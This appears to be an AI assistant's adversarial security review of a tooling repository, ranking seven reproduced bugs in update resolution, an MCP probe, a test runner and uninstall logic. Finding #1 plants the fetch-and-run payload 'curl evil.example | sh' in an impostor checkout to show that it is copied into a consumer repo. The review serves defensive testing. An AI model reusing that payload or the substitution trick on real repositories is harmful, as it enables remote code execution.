All seven attacks executed against the real code and landed. Here is the panel report.

## ADVERSARIAL findings — ranked most-severe first

Every finding below was **executed** against the code on `tool-templates`, not inferred. Commands are reproducible; the one for the top finding is saved as `/tmp/attack-astra-update-impostor.sh`.

### 1. astra-update: an impostor sibling checkout feeds arbitrary content into a repo (SEVERE)

`tools/lib/astra-update:96-102`. The third resolution fallback accepts **any** directory that (a) is a sibling of the consumer repo's parent, (b) shares the recorded source's *basename*, and (c) contains a `tools/` subdir. Nothing checks that it is the same project — not a remote URL, not a marker file, not a git identity. The docstring itself states the hazard ("a silently substituted source is how the wrong checkout feeds an update") and then ships exactly that substitution, gated only by a printed note.

Executed: a manifest recording a dead absolute source `/dead-machine/js-db-ad-astra`, an unmodified installed `foo.sh`, and a sibling directory named `js-db-ad-astra` containing `curl evil.example | sh`. `astra-update --pull` resolved the impostor, printed `note: ... resolved sibling`, and copied the payload into the consumer repo, exiting 0. On any machine with a checkouts workspace, a second repo whose basename collides (a fork, a stale clone, a tarball someone unpacked next door) silently becomes the update source. The existing portability test (`test-astra-update-portability.sh:54-58`) only ever puts the *correct* tree at the sibling path, so it green-lights the mechanism without ever testing a wrong one. Demonstrator: `/tmp/attack-astra-update-impostor.sh` → `BREAK DEMONSTRATED`.

### 2. mcp_tools: a blank line on stdout is misread as end-of-stream (CONFIRMED)

`tools/tool-templates/mcp_tools.py:100-119, 122-145`. `next_line()` returns `""` for a **zero-length line** (`pending[0][:0]` when the buffer starts with `\n`) and *also* returns `""` for real EOF (`chunk == b""`). `read_response()` cannot tell them apart — `if line == "": return ""` — and `probe()` then treats that as either "server closed its output" or, for the initialize step, falsy → `"no answer to initialize within Ns"`. A single empty line emitted before a response collapses the whole probe.

Executed: a stub that writes one `\n` before each JSON-RPC response. `list ... --timeout 5` returned `blanky: no answer to initialize within 5s`, rc 2 — instantly, not after 5s. This is the exact failure class the module's docstring claims to have eliminated (distinguishing empty / timeout / closed); a blank line is spec-irrelevant chatter that any server may emit, and here it is indistinguishable from a dead child. The chatty-server test (`test-mcp-tools.sh:36-39`) uses a banner that is a *non-empty* non-JSON line, so it never exercises the empty-line path.

### 3. run-all: a hung test stalls the tier forever; the 15-second budget is not an assertion against hangs (CONFIRMED)

`tools/tests/run-all.sh:39-58`. The budget check at line 61 runs **after** the `xargs` join and the result-collection loop, so it can only fire once every file has already exited. A single test file that blocks (waiting on a dialog, a dead socket, a `sleep`) makes `xargs` wait indefinitely; the elapsed-time comparison is never reached and no verdict is ever printed. The header calls the budget "AN ASSERTION, NOT A HOPE" and says a suite that grows past fifteen seconds "stops being run" — but the failure mode that actually stops the suite (a wedge) is the one the budget cannot catch, because catching it would require a wall-clock kill (`timeout`/`&` + watchdog) that the script does not have.

Executed: a `test-hung-stub.sh` with `sleep 300` in a copy of run-all. An external `timeout 20` had to kill it; it ran the full 20s and printed no budget message. `test-run-tiers.sh:68-74` only tests an *over-budget-but-terminating* file (`sleep 2` vs budget 1), never a non-terminating one, so the hang path is unverified.

### 4. template.py uninstall crashes on an unresolvable member (CONFIRMED)

`tools/lib/template.py:285-286`. The load-bearing `resolve_tools` call in `tools_still_claimed()` is wrapped in `try/except ValueError` (line 187-191, the documented flat-list fallback), but the **cosmetic recomputation** inside the `KEPT` branch of `_apply` is not:
```python
others = [n for n in installed_templates(repo) if n != name
          and t in resolve_tools(load()["templates"], n)]
```
When a still-installed wrapper template names a member that the catalogue no longer resolves, this raises `ValueError` and takes down the whole uninstall with an unhandled traceback — mid-run, after earlier members in `member_tools` may already have been removed.

Executed: manifest recording `alpha, beta, wrapper`, where `wrapper` composes a `renamed-away` member and `alpha`/`beta` share `sharedtool`. `uninstall alpha` produced a Python traceback (`ValueError: no such template: renamed-away`) after printing `uninstalling template 'alpha'`. The very scenario the flat-list fallback exists to survive is the one that crashes the display path.

### 5. periphery breaks template uninstall: install ignores `--into`, uninstall rejects it (CONFIRMED)

`tools/periphery/install.sh` takes no arguments and silently ignores `--into` (exits 0), while `tools/periphery/uninstall.sh` sources `uninstall-common.sh` whose `uc_parse` (`tools/lib/uninstall-common.sh:29`) treats any unknown `--*` as fatal: `--into` → `unknown flag '--into'`, exit 64. periphery is a member of the `swift` template, hence of `swift-ios` and `mac-swift`.

Executed: `periphery/install.sh --into /tmp` → rc 0; `periphery/uninstall.sh --into /tmp` → rc 64. Consequence via `template.py:290-311`: `template.py uninstall swift-ios` runs each member as `uninstall.sh --into <repo>`, periphery returns non-zero → `FAILED periphery`, `fail_n > 0` → the record-only-clean-runs rule (line 303) refuses to update the manifest. So `swift-ios` stays recorded as installed while ponytail and dedup-scan were already removed — the manifest now lies in the opposite direction from the one that rule was written to prevent. The "attack: what does uninstall-common's brew path do" question is moot; execution never reaches the brew path because argument parsing rejects the template contract first.

### 6. tooljson: a whitespace-only coordinate passes the empty-coordinate gate (CONFIRMED)

`tools/lib/tooljson.py:113-115`. The gate is `if not coord`, which is false for `"   "`. `brew:` with a blank coordinate is caught; `brew:   ` (spaces) validates and is emitted as a dependency `brew:    `. Duplicates are also un-deduplicated across and within ecosystems: `["brew:jq","brew:jq","npm:jq"]` all pass and all print. A dependency that is three spaces will never install, silently — the same "a typo'd ecosystem is a dependency that never installs" hazard the file cites, one layer down at the coordinate.

Executed: descriptor with `["brew:   ", "brew:jq", "brew:jq", "npm:jq"]` → `valid`, rc 0, emitting `brew:    ` and duplicate `brew: jq` lines. `test-tooljson.sh` tests only the `brew:`-empty and unknown-ecosystem cases, never whitespace or duplicates.

### 7. tools_still_claimed under-claims when a wrapper's only link to a shared tool is a renamed member (CONFIRMED — root cause of #4)

`tools/lib/template.py:186-192`. The flat-list fallback (`t.get(name, {}).get("tools", [])`) returns a wrapper's **own** tools only. When a wrapper claims a shared tool *transitively* through a member that the catalogue no longer resolves, the fallback returns an empty list, so `tools_still_claimed` reports the shared tool as unclaimed and the sibling uninstall removes it out from under the still-installed wrapper.

Executed: `wrapper` composes `renamed-away` (unresolvable) whose resolution would have pulled `sharedtool`; `alpha` also has `sharedtool`. `tools_still_claimed("repo", excluding="alpha")` returned an **empty set** — sharedtool would be uninstalled while `wrapper` still needs it. The code comment at line 189-191 asserts "under-claiming here is what deletes another template's tools" and then under-claims. (In practice #4's crash masks this by aborting first, but fix the crash and the silent tool-deletion is what remains.)

---

## Attacked and held

**`red()` exact-rc-plus-literal-diagnostic contract** (`lib.sh:53-94`). Attack: satisfy the contract while proving nothing. Held for the mechanism — the rc must be the exact declared nonzero value, 126/127 are refused as broken invocations, an empty diagnostic is refused, and old-style calls fail loudly with the migration message. `test-lib.sh` covers all of these by effect in child shells. **Residual, not a defect in red():** the guard cannot detect a diagnostic string so generic it matches unrelated failures — a call site passing `"error"` or `"failed"` as the expected substring would pass on the wrong failure. That is call-site discipline red() has no way to enforce; the sampled real call sites (`test-tooljson.sh`, `test-mcp-tools.sh`, `test-run-tiers.sh`) all use specific, load-bearing substrings (`"unknown dependency ecosystem 'cargo'"`, `"approval dialog"`, `"FAST TIER OVER BUDGET"`), so no live call site currently exploits the gap.

**xargs on a filename containing a space** (`run-all.sh:39`). Attack: a `test-*.sh` name with a space splits into two args under `xargs -I{}`. Held in practice — `-I{}` replaces the whole `{}` token with one input line, and the loop reads `"${fast[@]}"` as array elements, so a spaced name is passed whole. Not a live risk regardless: every real test file is `test-<word>.sh` with no spaces, and the glob would need a deliberately hostile filename.

**mcp_tools id-matching against interleaved notifications** (`mcp_tools.py:122-145`). Attack: a notification or banner between request and response is misread as the answer. Held — `read_response` loops until `obj.get("id") == want_id`, skipping non-JSON lines and non-matching ids. The chatty-server test confirms it. This is the one place the round-one fix genuinely closed the hole; finding #2 is a *different* hole (empty line = EOF) that the id-matching rewrite left open.

The most important two to fix are #1 (a remote-code-execution-shaped path through a name collision) and #2 (the probe's core promise is false for any server that prints a blank line). #3, #4, and #5 each turn a claimed safety property — budget-as-assertion, non-exclusive uninstall, clean manifest — into its opposite under one realistic input.
